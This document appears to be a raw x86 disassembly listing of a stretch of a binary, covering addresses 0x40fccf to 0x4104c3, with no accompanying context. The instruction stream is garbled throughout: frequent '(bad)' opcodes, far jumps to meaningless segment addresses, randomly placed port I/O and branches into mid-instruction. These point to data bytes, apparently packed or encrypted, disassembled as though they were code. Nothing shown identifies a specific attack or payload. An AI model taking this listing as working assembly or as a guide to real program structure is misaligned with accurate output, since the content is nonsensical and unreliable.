  40fccf:	aam    0x79
  40fcd1:	mov    ah,0x4d
  40fcd3:	cmc    
  40fcd4:	xor    cl,BYTE PTR [edi]
  40fcd6:	jo     0x40fd09
  40fcd8:	adc    BYTE PTR [ebx],cl
  40fcda:	das    
  40fcdb:	push   edx
  40fcdc:	add    DWORD PTR [edx+0x4c],ebx
  40fcdf:	sub    esi,DWORD PTR [ebp+ebp*4+0x32]
  40fce3:	dec    esi
  40fce4:	mov    edx,0x5326a153
  40fce9:	pop    eax
  40fcea:	pushf  
  40fceb:	sbb    eax,0x604cb068
  40fcf0:	ror    eax,cl
  40fcf2:	inc    edx
  40fcf4:	int    0xa8
  40fcf6:	mov    ss,edx
  40fcf8:	daa    
  40fcf9:	jmp    0x685b:0xbc1bc67f
  40fd00:	xchg   bx,ax
  40fd02:	shl    DWORD PTR [esi],0xd8
  40fd05:	add    BYTE PTR [esi+0x11a5205],ch
  40fd0b:	in     al,0x4
  40fd0d:	sub    DWORD PTR [ecx],ecx
  40fd0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd10:	mov    eax,ds:0x15a85a5a
  40fd15:	dec    eax
  40fd16:	push   eax
  40fd17:	sbb    al,0xc8
  40fd19:	pop    es
  40fd1a:	inc    BYTE PTR ds:0x25088006
  40fd20:	in     eax,dx
  40fd21:	iret   
  40fd22:	xchg   esi,eax
  40fd23:	mov    bh,0x83
  40fd25:	add    eax,0x640d3848
  40fd2a:	daa    
  40fd2b:	aam    0xdb
  40fd2d:	jb     0x40fd5b
  40fd2f:	fild   DWORD PTR [ebx+0x21]
  40fd32:	jmp    0xa5389222
  40fd37:	(bad)  
  40fd39:	fiadd  WORD PTR [ebp-0x36bbe488]
  40fd3f:	mov    dl,cl
  40fd41:	add    ecx,DWORD PTR [ebp+eax*4-0x55]
  40fd45:	mov    ebp,0x8510c2cc
  40fd4a:	mov    dh,0x9f
  40fd4c:	sub    DWORD PTR [ebx-0x23],eax
  40fd4f:	mov    al,ds:0xee582035
  40fd54:	adc    ah,bl
  40fd56:	sub    al,0xc7
  40fd58:	mov    ah,0xe4
  40fd5a:	in     eax,0xb8
  40fd5c:	add    al,0xad
  40fd5e:	mov    esi,edi
  40fd60:	mov    al,ds:0xa639ce64
  40fd65:	pop    edi
  40fd66:	mov    ds:0xf242918c,eax
  40fd6b:	mov    ebp,0xaac0ca5e
  40fd70:	fmul   DWORD PTR gs:[ebx]
  40fd73:	retf   
  40fd74:	imul   eax,DWORD PTR [esi],0xffffffdf
  40fd77:	cmp    eax,0x2542a4bd
  40fd7c:	div    DWORD PTR [eax]
  40fd7e:	popf   
  40fd7f:	cmp    DWORD PTR [edi+0x348d04ff],esi
  40fd85:	cld    
  40fd86:	pop    ebx
  40fd87:	rcl    cl,0x3a
  40fd8a:	jl     0x40fe06
  40fd8c:	adc    BYTE PTR [eax],al
  40fd8e:	inc    DWORD PTR [edi+esi*1-0x7e46cb26]
  40fd95:	aas    
  40fd96:	push   ss
  40fd97:	call   0x1422951e
  40fd9c:	cli    
  40fd9d:	aad    0x2c
  40fd9f:	fadd   DWORD PTR [esi+edi*4]
  40fda2:	sbb    dl,BYTE PTR [ecx+0x723ac059]
  40fda8:	sbb    DWORD PTR [ecx+0x78],eax
  40fdab:	or     al,0x87
  40fdae:	or     eax,0x9ba8ad8d
  40fdb3:	(bad)  
  40fdb4:	jmp    0x40fe0a
  40fdb6:	rcl    dh,1
  40fdb8:	jmp    0x3582:0x38da0c41
  40fdbf:	call   0xf8d682b4
  40fdc4:	sbb    BYTE PTR [ebp+0x68629fe1],bh
  40fdca:	das    
  40fdcb:	mov    ebx,0xbc7418b
  40fdd0:	scas   al,BYTE PTR es:[edi]
  40fdd1:	dec    eax
  40fdd2:	pushf  
  40fdd3:	sub    dl,BYTE PTR [esi-0x57]
  40fdd6:	cmp    eax,0x3202a1b9
  40fddb:	xor    bl,al
  40fddd:	jbe    0x40fd6a
  40fddf:	mov    edi,gs
  40fde1:	pop    esi
  40fde2:	out    dx,eax
  40fde3:	mov    ebx,eax
  40fde5:	jnp    0x40fda6
  40fde7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fde8:	cmp    ebx,DWORD PTR ds:[ebp+0x58]
  40fdec:	jae    0x40fddd
  40fdee:	dec    ecx
  40fdef:	sahf   
  40fdf0:	add    ch,BYTE PTR [edi-0x2627b8d9]
  40fdf6:	jmp    0x40fdf5
  40fdf8:	inc    eax
  40fdf9:	inc    edi
  40fdfa:	(bad)  
  40fdfb:	push   ebx
  40fdfc:	inc    ebx
  40fdfd:	lock adc dh,BYTE PTR [edi+0x56]
  40fe01:	test   esp,0xdbb3a07
  40fe07:	arpl   WORD PTR [eax-0x1687f998],ax
  40fe0d:	mov    ebx,0x19a43911
  40fe12:	pushf  
  40fe13:	retf   
  40fe14:	push   esi
  40fe15:	mov    esp,0x44dc08b0
  40fe1a:	xchg   edi,eax
  40fe1b:	push   ecx
  40fe1c:	push   eax
  40fe1d:	sbb    bl,dh
  40fe1f:	inc    esi
  40fe20:	shl    BYTE PTR [eax-0x778c529b],1
  40fe26:	fstp   TBYTE PTR [ebx-0x68]
  40fe29:	mov    bh,0x3
  40fe2b:	or     ch,dh
  40fe2d:	add    DWORD PTR [ebp-0x68d20e4f],edi
  40fe33:	jns    0x40fdf9
  40fe35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe36:	dec    esi
  40fe37:	or     bh,BYTE PTR [eax-0xec76ab4]
  40fe3d:	data16 add BYTE PTR [esi-0xa400d23],ah
  40fe44:	(bad)  
  40fe45:	pop    ecx
  40fe46:	dec    ebx
  40fe47:	scas   al,BYTE PTR es:[edi]
  40fe48:	sbb    ecx,ebp
  40fe4a:	mov    cl,0x27
  40fe4c:	test   bl,ah
  40fe4e:	cmp    edx,ecx
  40fe50:	pop    eax
  40fe51:	add    DWORD PTR [esi-0x5e41ef2c],esi
  40fe57:	es xor eax,0xc3e888b7
  40fe5d:	mov    edi,0x643a4556
  40fe62:	jecxz  0x40fe76
  40fe64:	push   ecx
  40fe65:	imul   edi,DWORD PTR [ebp-0x516d102c],0xb7885f0a
  40fe6f:	xor    BYTE PTR [eax+0x68d06352],al
  40fe75:	sub    dl,BYTE PTR [edx]
  40fe77:	xor    BYTE PTR [ecx-0x5],0xc
  40fe7b:	(bad)  
  40fe7c:	je     0x40fe86
  40fe7e:	ficomp WORD PTR [esi-0x7e8c0548]
  40fe84:	mov    cl,0x2c
  40fe86:	arpl   ax,bx
  40fe88:	dec    edi
  40fe89:	call   0xb91cb872
  40fe8e:	add    eax,0x41aa3de3
  40fe93:	cmp    bh,dl
  40fe95:	mov    DWORD PTR [eax+ecx*8+0x58180e7f],0xf909fcb9
  40fea0:	adc    BYTE PTR [ebp+0xf0b2ca0],ah
  40fea6:	es xchg edi,eax
  40fea8:	retf   0x325a
  40feab:	add    al,0x34
  40fead:	cwde   
  40feae:	xchg   DWORD PTR [eax+0x4f],ebp
  40feb1:	xchg   ebp,eax
  40feb2:	(bad)  [ebx+0x1]
  40feb5:	fsubp  st(7),st
  40feb7:	sbb    eax,0xaad7cd6c
  40febc:	dec    ebx
  40febd:	rcl    DWORD PTR [esi],0x77
  40fec0:	neg    DWORD PTR [ebx]
  40fec2:	pop    ecx
  40fec3:	mov    ebx,0x24de567c
  40fec8:	mov    ds:0x8cfe561e,eax
  40fecd:	sbb    DWORD PTR [ecx-0x5b875e7f],edx
  40fed3:	cld    
  40fed4:	xchg   DWORD PTR [esi],esi
  40fed6:	or     ch,BYTE PTR ds:0xfd6b23c8
  40fedc:	cmp    DWORD PTR [edi-0x12],edx
  40fedf:	scas   al,BYTE PTR es:[edi]
  40fee0:	into   
  40fee1:	cpuid  
  40fee3:	inc    ebx
  40fee4:	ds pop ds
  40fee6:	call   0x3123:0x40bb5d86
  40feed:	jbe    0x40fee1
  40feef:	sub    edx,ecx
  40fef1:	add    ebp,eax
  40fef3:	sub    al,0x54
  40fef5:	mov    edi,0x8c9680e2
  40fefa:	call   0xa66aa24f
  40feff:	dec    ebx
  40ff00:	pop    edx
  40ff01:	aam    0x5c
  40ff03:	(bad)  
  40ff04:	ja     0x40fefe
  40ff06:	(bad)  
  40ff07:	mov    ch,0xaa
  40ff09:	sbb    DWORD PTR [edi+0x17],ecx
  40ff0c:	push   cs
  40ff0d:	cld    
  40ff0e:	pushf  
  40ff0f:	mov    ah,0xf8
  40ff11:	jp     0x40ff2b
  40ff13:	adc    DWORD PTR [ebx+0x1d8191df],edx
  40ff19:	xchg   esi,eax
  40ff1a:	call   0x8451806f
  40ff1f:	in     eax,0x6d
  40ff21:	xchg   edx,eax
  40ff22:	push   ss
  40ff23:	jae    0x40ff68
  40ff25:	push   edx
  40ff26:	or     al,0x57
  40ff28:	fwait
  40ff29:	clc    
  40ff2a:	sub    eax,edx
  40ff2c:	dec    edi
  40ff2d:	sbb    eax,0xf393ef7f
  40ff32:	cmp    bl,cl
  40ff34:	cld    
  40ff35:	xor    DWORD PTR [eax+0x29],0x64caa9a4
  40ff3c:	mov    ds:0xb0c3815f,al
  40ff41:	pop    ebp
  40ff42:	add    al,BYTE PTR [ebx]
  40ff44:	and    eax,0x102a89f7
  40ff49:	cs clc 
  40ff4b:	mov    esp,0x8c9ecf9e
  40ff50:	loope  0x40ffac
  40ff52:	jle    0x40ff71
  40ff54:	pushf  
  40ff55:	in     eax,dx
  40ff56:	adc    DWORD PTR es:[edi],eax
  40ff59:	loop   0x40ffcf
  40ff5b:	addr16 ss inc ecx
  40ff5e:	and    eax,0xdf7a06ff
  40ff63:	pop    DWORD PTR [edx]
  40ff65:	data16 ds (bad) 
  40ff68:	xchg   esp,eax
  40ff69:	popf   
  40ff6a:	lods   al,BYTE PTR ds:[esi]
  40ff6b:	cmp    al,BYTE PTR [esi-0x64]
  40ff6e:	mov    dl,0x12
  40ff70:	sahf   
  40ff71:	pop    ebx
  40ff72:	(bad)  
  40ff73:	(bad)  
  40ff75:	xor    DWORD PTR [edi],ebp
  40ff77:	(bad)  
  40ff78:	popa   
  40ff79:	or     al,0xbc
  40ff7b:	retf   0x7ff0
  40ff7e:	scas   eax,DWORD PTR es:[edi]
  40ff7f:	inc    edx
  40ff80:	dec    edx
  40ff81:	idiv   ecx
  40ff83:	pop    es
  40ff84:	pop    esp
  40ff85:	mov    esi,ecx
  40ff87:	cmp    dh,BYTE PTR [esi+0x73]
  40ff8a:	fild   QWORD PTR [edx]
  40ff8c:	std    
  40ff8d:	jbe    0x40ff35
  40ff8f:	mov    al,ds:0x7e5b9ee5
  40ff94:	cld    
  40ff95:	pushf  
  40ff96:	xchg   esp,eax
  40ff97:	mov    ebx,0x327979a6
  40ff9c:	inc    ch
  40ff9e:	loop   0x410018
  40ffa0:	(bad)
  40ffa5:	mov    edx,0x9bbaa9ad
  40ffaa:	mov    al,0x47
  40ffac:	mov    bh,0xd
  40ffae:	and    cl,ch
  40ffb0:	push   ebp
  40ffb1:	mov    eax,DWORD PTR [eax+edx*2]
  40ffb4:	(bad)  
  40ffb5:	mov    ah,0x3d
  40ffb7:	sbb    DWORD PTR [edi],0xe14ebd25
  40ffbd:	or     eax,0xff4bc012
  40ffc2:	imul   ebx,eax,0xffffffc7
  40ffc5:	out    dx,eax
  40ffc6:	imul   edx,DWORD PTR [edi+0x70cb8116],0x3175437a
  40ffd0:	stos   BYTE PTR es:[edi],al
  40ffd1:	and    ah,BYTE PTR ds:0xe3c7da6a
  40ffd7:	sbb    BYTE PTR [ebx-0x326decf6],dl
  40ffdd:	mov    al,ds:0x1e8eabc0
  40ffe2:	cli    
  40ffe3:	test   edi,esp
  40ffe5:	nop
  40ffe6:	and    ch,BYTE PTR [ebp-0x2aecea21]
  40ffec:	mov    al,ds:0x3220db18
  40fff1:	aaa    
  40fff2:	dec    eax
  40fff3:	repnz or BYTE PTR es:[edx+0x61],bl
  40fff8:	bound  esp,QWORD PTR [ecx-0x72]
  40fffb:	pop    ebx
  40fffc:	jg     0x40ffbd
  40fffe:	mov    dh,ch
  410000:	in     al,0x64
  410002:	arpl   WORD PTR [ebx],dx
  410004:	mov    dh,0x9
  410006:	cmp    ebp,DWORD PTR [esi]
  410008:	popa   
  410009:	clc    
  41000a:	lods   eax,DWORD PTR ds:[esi]
  41000b:	or     ah,BYTE PTR [ecx+0x26072fba]
  410011:	add    DWORD PTR ds:0x49c2c59e,0x3c
  410018:	mov    ebp,0x711902a5
  41001d:	dec    eax
  41001e:	iret   
  41001f:	sbb    eax,0xddf6ac6a
  410024:	test   DWORD PTR ds:0x46d84afa,0x359bb95e
  41002e:	xor    al,0xaa
  410030:	in     al,dx
  410031:	xor    eax,0x128cccd8
  410036:	xchg   esp,eax
  410037:	les    esp,FWORD PTR [edi]
  410039:	test   BYTE PTR [esi-0x7],dl
  41003c:	loope  0x410065
  41003e:	xor    esi,DWORD PTR [eax-0x1daf204]
  410044:	test   DWORD PTR [eax],esi
  410046:	fs jl  0x4100ab
  410049:	pop    edi
  41004a:	push   ds
  41004b:	add    esp,DWORD PTR [ebp+esi*4+0x5f]
  41004f:	dec    eax
  410050:	cmp    al,0xda
  410052:	fst    DWORD PTR [ebp+0x3f207f55]
  410058:	mov    al,ds:0xe7a4eabe
  41005d:	inc    ebp
  41005e:	add    al,0xda
  410060:	aaa    
  410061:	xor    eax,0x23fd7a22
  410066:	sbb    ah,BYTE PTR [esp+ecx*4]
  410069:	ss enter 0x1a2f,0x7
  41006e:	xchg   ecx,eax
  41006f:	sbb    DWORD PTR [edi+0x44],esi
  410072:	ins    BYTE PTR es:[edi],dx
  410073:	mov    eax,ds:0xac09ff92
  410078:	not    BYTE PTR [esi]
  41007a:	pusha  
  41007b:	sbb    ecx,edx
  41007d:	mov    BYTE PTR [edi-0x431775],al
  410083:	dec    ebp
  410084:	out    dx,al
  410085:	inc    esi
  410086:	nop
  410087:	pop    ss
  410088:	xor    BYTE PTR [edx+0x140abe21],dl
  41008e:	gs (bad) 
  410090:	mov    ecx,0xff1c07a5
  410095:	retf   
  410096:	out    0xe,al
  410098:	pusha  
  410099:	push   edi
  41009a:	ins    DWORD PTR es:[edi],dx
  41009b:	addr16 sub eax,0x73065f62
  4100a1:	jno    0x41006f
  4100a3:	pop    ebp
  4100a4:	dec    edi
  4100a5:	add    al,0x81
  4100a7:	pop    ebx
  4100a8:	cdq    
  4100a9:	addr16 das 
  4100ab:	push   ebp
  4100ac:	in     al,dx
  4100ad:	add    al,0x30
  4100af:	pusha  
  4100b0:	dec    edi
  4100b1:	add    ecx,edx
  4100b3:	jmp    FWORD PTR [edx+ebp*1+0x77c0fc8]
  4100ba:	sbb    DWORD PTR [ebx],esp
  4100bc:	mov    DWORD PTR [ecx-0x2399995a],edi
  4100c2:	es stc 
  4100c4:	test   BYTE PTR [edx],dl
  4100c6:	imul   ecx,DWORD PTR [esi],0xffffff9b
  4100c9:	mov    bh,0x53
  4100cb:	adc    al,bl
  4100cd:	outs   dx,BYTE PTR ds:[esi]
  4100cf:	lock pop esi
  4100d1:	xchg   ebp,eax
  4100d2:	push   ds
  4100d3:	sbb    eax,DWORD PTR [edi+edi*4]
  4100d6:	sbb    eax,0x1c6e0b74
  4100db:	std    
  4100dc:	inc    ebx
  4100dd:	out    0x69,al
  4100df:	push   ebp
  4100e0:	mov    bh,0x89
  4100e2:	push   0xa0fdd08c
  4100e7:	lock outs dx,DWORD PTR ds:[esi]
  4100e9:	mov    al,ds:0x204e1490
  4100ee:	dec    edx
  4100ef:	(bad)  
  4100f0:	retf   
  4100f1:	push   cs
  4100f2:	test   DWORD PTR [edx+eax*1],0xcbcac0dc
  4100f9:	jb     0x41012b
  4100fb:	mov    cl,0xbc
  4100fd:	nop
  4100fe:	xor    eax,0x9812ba2f
  410103:	xor    al,0x48
  410105:	cmp    DWORD PTR [eax+0x3546e3a0],ebx
  41010b:	mov    bh,0x1a
  41010d:	adc    al,0x23
  41010f:	(bad)  
  410110:	pushf  
  410111:	ret    
  410112:	mov    al,ds:0xa6b1432b
  410117:	push   ds
  410118:	dec    ecx
  410119:	dec    ebp
  41011a:	loop   0x4100bc
  41011c:	rol    bh,0xf
  41011f:	jmp    edx
  410121:	push   0x32352d18
  410126:	fist   WORD PTR [edi+0x321a24e8]
  41012c:	push   es
  41012d:	inc    ebp
  41012e:	in     al,0x52
  410130:	dec    esp
  410131:	in     al,0x39
  410133:	out    0x23,eax
  410135:	push   ss
  410136:	push   edi
  410137:	nop
  410138:	fistp  DWORD PTR [ebp+0xc7cb37e]
  41013e:	(bad)
  410141:	loope  0x410135
  410143:	(bad)  [eax-0x6ca7be54]
  410149:	pushf  
  41014a:	call   0xfb5db0ad
  41014f:	jge    0x4101c8
  410151:	loope  0x4100e1
  410153:	pop    esp
  410154:	jge    0x410199
  410156:	push   eax
  410157:	aam    0xe3
  410159:	mov    ds:0x293f8a88,al
  41015e:	pop    ss
  41015f:	rcl    esi,cl
  410161:	mov    eax,0x34f3ee88
  410166:	adc    DWORD PTR [ecx],edi
  410168:	cmc    
  410169:	stos   BYTE PTR es:[edi],al
  41016a:	das    
  41016b:	retf   0xe8d2
  41016e:	daa    
  41016f:	rcl    BYTE PTR [edi-0x5b164906],cl
  410175:	xor    ch,BYTE PTR [eax+0x2c7143ac]
  41017b:	ret    0x5d66
  41017e:	ds mov ecx,0xb9709107
  410184:	hlt    
  410185:	and    esi,ebx
  410187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410188:	(bad)  
  410189:	pushf  
  41018a:	push   ecx
  41018b:	jnp    0x41017b
  41018d:	test   eax,0x2a64399d
  410192:	adc    bl,ch
  410194:	xor    BYTE PTR ss:[ebx-0x6e],bh
  410198:	stos   DWORD PTR es:[edi],eax
  410199:	pop    ds
  41019a:	popf   
  41019b:	mov    dh,0xce
  41019d:	ror    DWORD PTR [edi-0x1e],0x87
  4101a1:	mov    ah,0x9c
  4101a3:	xor    al,0x30
  4101a5:	jae    0x4101c3
  4101a7:	(bad)  
  4101a8:	jbe    0x4101b0
  4101aa:	fadd   DWORD PTR [edx*1+0x6ac60b9a]
  4101b1:	fsubrp st(3),st
  4101b3:	xchg   ecx,eax
  4101b4:	adc    al,0x31
  4101b6:	pop    ebp
  4101b7:	pop    edi
  4101b8:	xor    ch,dl
  4101ba:	into   
  4101bb:	dec    ebp
  4101bc:	xchg   edx,eax
  4101bd:	jne    0x410208
  4101bf:	dec    ecx
  4101c0:	mov    ch,0x46
  4101c2:	push   0x74
  4101c4:	test   esi,edx
  4101c6:	ret    0xc6ca
  4101c9:	sub    dl,ah
  4101cb:	ficomp WORD PTR [ecx-0xd90840a]
  4101d1:	xchg   esp,eax
  4101d2:	push   eax
  4101d3:	add    dh,ah
  4101d5:	fcom   DWORD PTR [esi]
  4101d7:	adc    al,0x60
  4101d9:	ds mov esp,0x31df73f5
  4101df:	stos   DWORD PTR es:[edi],eax
  4101e0:	ret    
  4101e1:	lods   al,BYTE PTR ds:[esi]
  4101e2:	xchg   edi,eax
  4101e3:	sbb    al,0x10
  4101e5:	jmp    0x5d65:0xef899abb
  4101ec:	mov    ch,0x7
  4101ee:	repz jae 0x410269
  4101f1:	cmp    al,BYTE PTR [edx-0x19]
  4101f4:	dec    ecx
  4101f5:	lahf   
  4101f6:	or     DWORD PTR [esi+0x6b],esi
  4101f9:	mov    esi,0x8dcbb48b
  4101fe:	addr16 (bad) 
  410200:	rol    DWORD PTR [ebx+0x7e],1
  410203:	(bad)  
  410204:	popf   
  410205:	lds    esi,FWORD PTR [esi+0x70]
  410208:	mov    ah,0xb1
  41020a:	sbb    ah,BYTE PTR [eax]
  41020c:	test   DWORD PTR [ebx],edi
  41020e:	aas    
  41020f:	sub    ebx,DWORD PTR [esi+0x790d8d14]
  410215:	add    cl,BYTE PTR [ecx]
  410217:	mov    edx,0xa505641e
  41021c:	push   es
  41021d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41021e:	xor    ebx,0x36
  410221:	jns    0x410219
  410223:	lds    edi,FWORD PTR [edi+edx*1+0x70]
  410227:	popa   
  410228:	lds    esp,FWORD PTR [esi+0x17]
  41022b:	addr16 mov al,ds:0x9885
  41022f:	adc    al,0xd3
  410231:	daa    
  410232:	mov    esi,0x285a8be2
  410237:	faddp  st(4),st
  410239:	iret   
  41023a:	(bad)  
  41023b:	(bad)  
  41023c:	fisubr WORD PTR [edi+0x54542fa5]
  410242:	adc    al,0x71
  410244:	mov    ebp,0x15ef8422
  410249:	or     al,0xb5
  41024b:	or     eax,0xfb2acf2f
  410250:	jae    0x410274
  410252:	leave  
  410253:	loopne 0x410241
  410255:	pop    ebp
  410256:	pusha  
  410257:	loope  0x410281
  410259:	add    al,BYTE PTR [ecx+0x20f1b7d3]
  41025f:	lock inc ebx
  410261:	std    
  410262:	cmc    
  410263:	sbb    DWORD PTR [ecx+0x24],0xffffff97
  410267:	lds    esp,FWORD PTR [eax+0x46ccef7a]
  41026d:	pop    es
  41026e:	cmp    dh,dh
  410270:	cmp    bl,dl
  410272:	pop    eax
  410273:	xchg   ebx,eax
  410274:	xor    dl,BYTE PTR [ebp+eiz*2+0x143cae0a]
  41027b:	mov    ds:0xee884cfb,al
  410280:	clc    
  410281:	fs loopne 0x4102e2
  410284:	mov    ds:0x284f2314,al
  410289:	sbb    eax,0x88846e0f
  41028e:	(bad)  
  41028f:	push   cs
  410290:	jae    0x4102a7
  410292:	pop    ebp
  410293:	jnp    0x41021a
  410295:	loope  0x41023e
  410297:	jo     0x4102da
  410299:	in     al,0xec
  41029b:	inc    esp
  41029c:	add    al,0xf6
  41029e:	lods   eax,DWORD PTR ds:[esi]
  41029f:	jmp    0x410302
  4102a1:	test   al,0x50
  4102a3:	mov    dh,0x79
  4102a5:	out    dx,eax
  4102a6:	and    al,0x2
  4102a9:	loopne 0x410298
  4102ab:	out    0x74,eax
  4102ad:	sar    BYTE PTR [esi*2+0x39e28273],cl
  4102b4:	stc    
  4102b5:	clc    
  4102b6:	and    edi,ebp
  4102b8:	lods   al,BYTE PTR ds:[esi]
  4102b9:	push   esp
  4102ba:	test   DWORD PTR [esi+ebp*1+0x481f8e5e],ebp
  4102c1:	jp     0x41031c
  4102c3:	push   edi
  4102c4:	repnz test al,0x1a
  4102c7:	cmc    
  4102c8:	and    bh,BYTE PTR [ebx]
  4102ca:	add    BYTE PTR [esi],0x87
  4102cd:	push   0x59
  4102cf:	adc    DWORD PTR [ebp+eiz*1-0x10],ecx
  4102d3:	iret   
  4102d4:	adc    BYTE PTR [edx],al
  4102d6:	xchg   ecx,eax
  4102d7:	mov    bh,BYTE PTR [edx+ebp*1-0x80]
  4102db:	fstp   DWORD PTR [ecx-0x2486e7cd]
  4102e2:	sbb    ah,BYTE PTR [edx-0x5c8173c0]
  4102e8:	jmp    0x34a7:0x48af9739
  4102ef:	mov    esp,0x1530baa3
  4102f4:	push   ss
  4102f5:	aas    
  4102f6:	pop    ecx
  4102f7:	inc    edx
  4102f8:	sub    eax,0x4b81a1b4
  4102fd:	loop   0x410314
  4102ff:	inc    edi
  410300:	xchg   edi,eax
  410301:	shl    DWORD PTR [edx],cl
  410303:	retf   0x1b8c
  410306:	les    esi,FWORD PTR [ebp+ebx*2+0x1553910e]
  41030d:	inc    ebp
  41030e:	mov    bl,0x93
  410310:	pop    eax
  410311:	jns    0x4102e3
  410313:	mov    bh,0x74
  410315:	scas   al,BYTE PTR es:[edi]
  410316:	ret    0xe49c
  410319:	fldl2t 
  41031b:	push   edi
  41031c:	mov    edx,DWORD PTR ds:0xab2e5022
  410322:	test   al,0x52
  410324:	xchg   edi,eax
  410325:	add    DWORD PTR [edx-0x72],eax
  410328:	sbb    ecx,eax
  41032a:	jmpw   0x6144
  41032e:	ins    BYTE PTR es:[edi],dx
  41032f:	push   edi
  410330:	outs   dx,DWORD PTR ds:[esi]
  410331:	in     al,0xb5
  410333:	dec    ebx
  410334:	iret   
  410335:	aad    0x83
  410337:	loop   0x41039a
  410339:	cmp    eax,0x9e92233e
  41033e:	xchg   esi,eax
  41033f:	data16 shl BYTE PTR [edi+0x2b0f83f3],1
  410346:	(bad)  
  410347:	mov    eax,ds:0xf72f453a
  41034c:	mov    eax,ds:0xb69d513b
  410351:	xchg   esi,eax
  410352:	(bad)  
  410353:	cmp    BYTE PTR [esi],dl
  410355:	cmp    al,BYTE PTR [eax+0x4a49a3be]
  41035b:	ins    BYTE PTR es:[edi],dx
  41035c:	ja     0x410332
  41035e:	lahf   
  41035f:	int    0x7f
  410361:	(bad)  
  410362:	mov    edx,0xa9667c8b
  410367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410368:	outs   dx,DWORD PTR ds:[esi]
  410369:	lahf   
  41036a:	hlt    
  41036b:	push   es
  41036c:	sbb    al,0xe6
  41036e:	mov    al,0x71
  410370:	call   0x8415:0x24048f6d
  410377:	jo     0x410324
  410379:	push   ds
  41037a:	xchg   BYTE PTR [ecx-0x28],al
  41037d:	cmp    BYTE PTR [eax],ah
  41037f:	mov    WORD PTR [eax-0x12],gs
  410382:	lods   al,BYTE PTR ds:[esi]
  410383:	int    0xd8
  410385:	push   esi
  410386:	ds retf 0xf316
  41038a:	pop    edi
  41038b:	xor    bp,WORD PTR [esi-0x7471e32c]
  410392:	jo     0x410326
  410394:	pop    ss
  410395:	retf   
  410396:	ret    0x2c83
  410399:	xchg   edi,eax
  41039a:	inc    edx
  41039b:	repz popa 
  41039d:	test   BYTE PTR [edx+0x7d],al
  4103a0:	sub    eax,0xb08136c4
  4103a5:	fwait
  4103a6:	push   ebp
  4103a7:	call   0x7b7d:0x953c040
  4103ae:	adc    eax,0x57aeda81
  4103b3:	or     al,0xae
  4103b5:	sbb    ebx,DWORD PTR cs:0x81497c14
  4103bc:	mov    ah,0xc6
  4103be:	lds    ebx,FWORD PTR [eax-0x7f1a3225]
  4103c4:	sbb    eax,0x5bc5ab28
  4103c9:	push   ebx
  4103ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103cb:	popf   
  4103cc:	(bad)  
  4103ce:	add    ecx,0x75648e91
  4103d4:	rcl    BYTE PTR [eax],cl
  4103d6:	xchg   esi,eax
  4103d7:	add    DWORD PTR [eax],eax
  4103d9:	addr16 cmc 
  4103db:	addr16 jge 0x410399
  4103de:	scas   al,BYTE PTR es:[edi]
  4103df:	test   BYTE PTR [ecx+0x4f0ade8f],bl
  4103e5:	or     BYTE PTR [eax+0x19],0x26
  4103e9:	arpl   WORD PTR [ebx+eax*4],ax
  4103ec:	fisttp WORD PTR [edx]
  4103ee:	pop    edi
  4103ef:	jecxz  0x410430
  4103f1:	mov    WORD PTR [ebx],es
  4103f3:	ins    BYTE PTR es:[edi],dx
  4103f4:	jle    0x410460
  4103f6:	sar    ah,1
  4103f8:	or     bl,ah
  4103fa:	dec    ebx
  4103fb:	nop
  4103fc:	xor    eax,0xad8cbd35
  410401:	shl    DWORD PTR [edi-0x765ef695],0xa3
  410408:	jnp    0x4103d3
  41040a:	xor    eax,0x7ba90f6b
  41040f:	sub    al,0xb3
  410411:	cmp    esi,DWORD PTR [ebx]
  410413:	ror    BYTE PTR [ebp+0x51],1
  410416:	pop    ecx
  410417:	cwde   
  410418:	sub    eax,0xdcdfe336
  41041d:	dec    edi
  41041e:	adc    edx,ebp
  410420:	outs   dx,DWORD PTR ds:[esi]
  410421:	xor    al,BYTE PTR [esi-0x2d]
  410424:	adc    ebx,DWORD PTR [ebx-0x51]
  410427:	shl    BYTE PTR [eax-0x15],1
  41042a:	adc    eax,0x3f4762a7
  41042f:	(bad)  
  410430:	cdq    
  410431:	retf   0xb1f5
  410434:	mov    ebx,0xca06ddd3
  410439:	or     al,0x89
  41043b:	inc    esp
  41043c:	mov    ebp,0x7de954fc
  410441:	pop    eax
  410442:	into   
  410443:	sbb    eax,0x482fdce
  410448:	outs   dx,BYTE PTR ds:[esi]
  410449:	push   0xffffffcb
  41044b:	cli    
  41044c:	push   esp
  41044d:	dec    edx
  41044e:	jnp    0x4103d7
  410450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410451:	xchg   esp,eax
  410452:	mov    al,BYTE PTR [ebp-0x6c]
  410455:	cmp    ebp,DWORD PTR [ebp-0x469bc5cc]
  41045b:	scas   eax,DWORD PTR es:[edi]
  41045c:	mov    al,ds:0x32858d27
  410461:	retf   0x512
  410464:	or     BYTE PTR [edi-0xce99f26],bl
  41046a:	test   al,0x73
  41046c:	sub    BYTE PTR [eax],bl
  41046e:	mov    bl,0xf8
  410470:	cmp    ch,dh
  410472:	in     eax,dx
  410473:	cli    
  410474:	jg     0x410467
  410476:	mov    al,ds:0x3c290d3b
  41047b:	push   ds
  41047c:	pushf  
  41047d:	cmp    DWORD PTR [edi],0x20
  410480:	sub    eax,0xc517f9ba
  410485:	or     ah,BYTE PTR [ebp+0x4d]
  410488:	push   es
  410489:	push   cs
  41048a:	lock jmp 0xc01e3d60
  410490:	xchg   ecx,eax
  410491:	ja     0x410416
  410493:	xor    BYTE PTR [edi-0x456ffc32],ah
  410499:	cmp    edx,eax
  41049b:	adc    DWORD PTR [ecx+0x602d9c7c],ebx
  4104a1:	jl     0x41049c
  4104a3:	sbb    eax,0x9dae2d09
  4104a8:	pop    eax
  4104a9:	(bad)  
  4104aa:	stc    
  4104ab:	cmp    eax,0x3df845d0
  4104b0:	sub    BYTE PTR [edi+esi*2-0x56],ah
  4104b4:	imul   ebx,esp,0x729dc6a
  4104ba:	test   al,0x66
  4104bc:	and    esp,DWORD PTR [ebx]
  4104be:	sbb    DWORD PTR ds:[ecx],eax
  4104c1:	xchg   esi,eax
  4104c2:	xchg   edi,eax
  4104c3:	adc    BYTE PTR [eax+0x6c],cl
